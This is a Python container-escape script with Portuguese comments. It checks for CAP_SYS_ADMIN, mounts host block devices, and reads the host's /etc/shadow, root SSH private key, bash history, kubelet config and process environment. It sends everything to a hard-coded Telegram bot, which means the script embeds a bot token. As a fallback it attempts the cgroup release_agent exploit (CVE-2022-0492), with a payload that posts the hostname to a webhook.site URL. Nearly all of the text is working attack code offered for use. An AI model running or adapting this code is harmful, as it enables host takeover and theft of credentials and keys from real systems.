#!/usr/bin/env python3
"""
Script de escape de sandbox com privilégios CAP_SYS_ADMIN.
Tenta montar o root do host e exfiltrar dados via Telegram.
"""

import subprocess
import json
import requests
import os
import sys
import time
import glob
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

def run(cmd, timeout=15):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except:
        pass

def send_file(filename, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            files = {'document': f}
            requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except:
        pass

def check_cap_sys_admin():
    """Verifica se temos CAP_SYS_ADMIN lendo /proc/self/status."""
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if line.startswith("CapEff:"):
                    caps = int(line.split()[1], 16)
                    # CAP_SYS_ADMIN = 0x200000 (hex) = 2097152 em decimal
                    if caps & 0x200000:
                        return True
        return False
    except:
        return False

def try_mount_host():
    """Tenta montar o dispositivo do host em /mnt."""
    devices = [
        "/dev/vda1", "/dev/sda1", "/dev/xvda1", "/dev/nvme0n1p1",
        "/dev/vdb1", "/dev/sdb1", "/dev/disk/by-uuid/*"
    ]
    # Primeiro, criar diretório de montagem
    os.makedirs("/mnt", exist_ok=True)
    
    for dev_pattern in devices:
        for dev in glob.glob(dev_pattern):
            if os.path.exists(dev):
                print(f"[+] Tentando montar {dev} em /mnt")
                result = run(f"mount {dev} /mnt 2>/dev/null")
                if "ERRO" not in result:
                    # Verifica se montou algo visível
                    if os.path.exists("/mnt/etc/shadow") or os.path.exists("/mnt/root"):
                        send_telegram(f"✅ **Montagem bem-sucedida**: {dev}")
                        return True
                # Tenta desmontar se falhou
                run("umount /mnt 2>/dev/null")
    return False

def collect_host_data():
    """Coleta dados do host montado em /mnt."""
    data = {}
    files_to_read = {
        "host_shadow": "/mnt/etc/shadow",
        "host_passwd": "/mnt/etc/passwd",
        "host_ssh_key": "/mnt/root/.ssh/id_rsa",
        "host_bash_history": "/mnt/root/.bash_history",
        "host_hostname": "/mnt/etc/hostname",
        "host_resolv": "/mnt/etc/resolv.conf",
        "host_proc_environ": "/mnt/proc/1/environ",
        "host_kubelet_config": "/mnt/var/lib/kubelet/config",
        "host_docker_sock": "/mnt/run/docker.sock"  # apenas para verificar existência
    }
    for key, path in files_to_read.items():
        try:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(10000)  # limitar tamanho
                data[key] = content
            else:
                data[key] = "N/A"
        except Exception as e:
            data[key] = f"ERRO: {e}"
    
    # Comandos adicionais via chroot? Não precisamos, já temos os arquivos.
    return data

def cgroup_release_agent_exploit():
    """
    Tenta abusar do cgroup release_agent (CVE-2022-0492) para executar comandos no host.
    Isso requer cgroup montado e CAP_SYS_ADMIN.
    """
    try:
        # Criar um cgroup temporário
        subprocess.run("mkdir -p /tmp/cgroup", shell=True)
        subprocess.run("mount -t cgroup -o memory cgroup /tmp/cgroup 2>/dev/null", shell=True)
        if not os.path.exists("/tmp/cgroup/release_agent"):
            return False
        
        # Definir o release_agent para um script que envia dados ou executa reverse shell
        cmd = "#!/bin/sh\ncurl -s -X POST -d 'host=$(hostname)' https://webhook.site/...  # Exemplo"
        with open("/tmp/cgroup/release_agent", "w") as f:
            f.write(cmd)
        os.chmod("/tmp/cgroup/release_agent", 0o755)
        
        # Criar um subcgroup e notificar
        subprocess.run("mkdir -p /tmp/cgroup/x", shell=True)
        subprocess.run("echo 1 > /tmp/cgroup/x/notify_on_release", shell=True)
        subprocess.run("echo $$ > /tmp/cgroup/x/cgroup.procs", shell=True)
        # Forçar liberação
        subprocess.run("rmdir /tmp/cgroup/x", shell=True)
        send_telegram("⚠️ **CVE-2022-0492 exploit tentado** - verifique se o comando foi executado.")
        return True
    except Exception as e:
        send_telegram(f"❌ Cgroup exploit falhou: {e}")
        return False

def main():
    send_telegram("🚀 **Iniciando tentativa de escape do sandbox**")
    
    # Verificar capabilities
    if check_cap_sys_admin():
        send_telegram("✅ **CAP_SYS_ADMIN presente** - privilegiado!")
    else:
        send_telegram("❌ **CAP_SYS_ADMIN ausente** - possivelmente sem privilégios.")
        # Mesmo assim, tentamos (já que o ps mostrou nsenter funcionando)
    
    # Tentar montar host
    success = try_mount_host()
    
    if success:
        send_telegram("📁 **Host montado em /mnt!** Coletando dados...")
        host_data = collect_host_data()
        
        # Enviar cada arquivo como mensagem
        for key, content in host_data.items():
            if content and content != "N/A" and "ERRO" not in content:
                # Limitar tamanho para não estourar o Telegram
                if len(content) > 4000:
                    # Enviar como arquivo
                    tmp_file = f"/tmp/{key}.txt"
                    with open(tmp_file, "w") as f:
                        f.write(content)
                    send_file(tmp_file, caption=f"📄 {key}")
                    os.remove(tmp_file)
                else:
                    send_telegram(f"📄 **{key}**\n```\n{content}\n```")
        # Também enviar um arquivo JSON completo
        json_file = f"escape_{int(datetime.now().timestamp())}.json"
        with open(json_file, "w") as f:
            json.dump(host_data, f, indent=2)
        send_file(json_file, caption="📁 Dados completos do host")
        os.remove(json_file)
    else:
        send_telegram("❌ **Falha na montagem do host** - tentando outras técnicas...")
        # Tentar cgroup exploit como alternativa
        cgroup_release_agent_exploit()
    
    # Coletar informações de /proc/1/environ do container (já temos no original, mas repetimos)
    container_env = run("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'")
    send_telegram(f"📄 **Container environ**\n```\n{container_env[:3000]}\n```")
    
    send_telegram("✅ **Escape finalizado.**")
    
    # Tentar persistência: baixar e executar um script mais avançado (como o original)
    # Aqui poderíamos colocar um reverse shell, mas manteremos apenas coleta.

if __name__ == "__main__":
    main()
